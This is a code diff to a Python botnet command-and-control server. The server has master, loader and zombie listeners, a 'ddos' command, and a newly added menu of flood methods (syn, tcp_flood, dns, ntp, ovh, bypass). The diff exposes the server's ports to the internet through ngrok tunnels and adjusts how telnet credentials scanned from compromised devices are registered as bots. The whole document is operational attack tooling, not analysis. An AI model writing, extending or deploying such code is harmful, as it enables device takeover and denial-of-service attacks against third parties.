@@ -1,5 +1,6 @@
 from lib import network, database, console, tools
 import threading, socket, random, time
+from pyngrok import ngrok
 
 class Master(threading.Thread):
     def __init__(self, console: console.Console, color: console.Color, database: database.Database, socket_session: socket.socket, ip: str, port: int):
@@ -90,8 +91,8 @@ class Master(threading.Thread):
             else:
                 self.login_attemp += 1
 
-            self.username = self.recv('Username: ')
-            self.password = self.recv('Password: ')
+            self.username = self.recv(f'{self.color.red}>{self.color.reset} Username{self.color.reset}: ')
+            self.password = self.recv(f'{self.color.red}>{self.color.reset} Password{self.color.reset}: ')
 
             if self.database.user_valid(self.username, self.password):
                 self.grade = self.database.get_user(self.username)['grade']
@@ -109,6 +110,13 @@ class Master(threading.Thread):
 
             argument = cmd.split(' ')
             command = argument[0]
+
+            if command == 'clear':
+                self.clear_screen()
+
+            if command == 'method':
+                table = self.console.get_table_fade('Methods', '💥', ['http', 'syn', 'tcp_flood', 'dns', 'ntp', 'bypass', 'ovh'])
+                self.bulk_send(table)
 
             if command == 'ddos':
                 if len(argument) < 4:
@@ -201,13 +209,17 @@ class Loader(threading.Thread):
                 args = data.split('|')
                 req_type = args[0]
                 
-                # scan|127.0.0.1|23|user|pass|telnet
+                # scan|127.0.0.1|23|user|pass|telnet 
                 if req_type == 'scan':
                     ip = args[1]
                     port = args[2]
                     username = args[3]
                     password = args[4]
                     device_type = args[5]
+
+                    # Due to bug :c, 
+                    if device_type == 'telnetscan':
+                        device_type = 'telnet'
 
                     count = self.database.create_bot(username, password, ip, port, device_type)
                     if device_type == 'telnet':
@@ -273,7 +285,7 @@ class Zombie(threading.Thread):
     def run(self):
         threading.Thread(target= self.loop_thread).start()
         self.database.online_zombie.append(self)
-        
+
 # Rip this part, anyone optimize ?
 class Handler(threading.Thread):
     def __init__(self, database: database.Database, console: console.Console, color: console.Color):
@@ -282,30 +294,33 @@ class Handler(threading.Thread):
         self.console = console
         self.color = color
 
-    def master_thread(self, port: int):
+    def master_thread(self, port: int, url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind(('0.0.0.0', port))
-        self.console.print_success(f'Master -> online -> port: {port}')
+
+        self.console.print_success(f'Master -> online -> port: {port} -> url {url}')
 
         while True:
             sock.listen(1000)
             (socket_session, (ip, port)) = sock.accept()
             Master(self.console, self.color, self.database, socket_session, ip, port).start()
     
-    def loader_thread(self, port: int):
+    def loader_thread(self, port: int, url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind(('0.0.0.0', port))
-        self.console.print_success(f'Loader -> online -> port: {port}')
+
+        self.console.print_success(f'Loader -> online -> port: {port} -> url {url}')
 
         while True:
             sock.listen(1000)
             (socket_session, (ip, port)) = sock.accept()
             Loader(self.console, self.database, socket_session, ip, port).start()
 
-    def zombie_thread(self, port: int):
+    def zombie_thread(self, port: int, url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind(('0.0.0.0', port))
-        self.console.print_success(f'Zombie -> online -> port: {port}')
+
+        self.console.print_success(f'Zombie -> online -> port: {port} -> url {url}')
 
         while True:
             sock.listen(1000)
@@ -313,12 +328,21 @@ class Handler(threading.Thread):
             Zombie(self.console, self.database, socket_session, ip, port).start()
 
     def run(self):
-        threading.Thread(target= self.master_thread, args= (random.randint(1500, 30000),)).start()
-        threading.Thread(target= self.loader_thread, args= (random.randint(30001, 55000),)).start()
-        threading.Thread(target= self.zombie_thread, args= (random.randint(55001, 65000),)).start()
+        # Rip shit code btw 
+        mp = random.randint(1500, 30000)
+        lp = random.randint(30001, 55000)
+        zp = random.randint(55001, 65000)
+
+        ml = (ngrok.connect(mp, 'tcp').public_url).split('://')[1]
+        ll = (ngrok.connect(lp, 'tcp').public_url).split('://')[1]
+        zl = (ngrok.connect(zp, 'tcp').public_url).split('://')[1]
+
+        threading.Thread(target= self.master_thread, args= (mp, ml,)).start()
+        threading.Thread(target= self.loader_thread, args= (lp, ll,)).start()
+        threading.Thread(target= self.zombie_thread, args= (zp, zl,)).start()
 
 if __name__ == '__main__':
-    Database = database.Database('mongodb+srv://.....')
+    Database = database.Database('mongodb+srv://......')
     Console = console.Console()
     Color = console.Color()
 
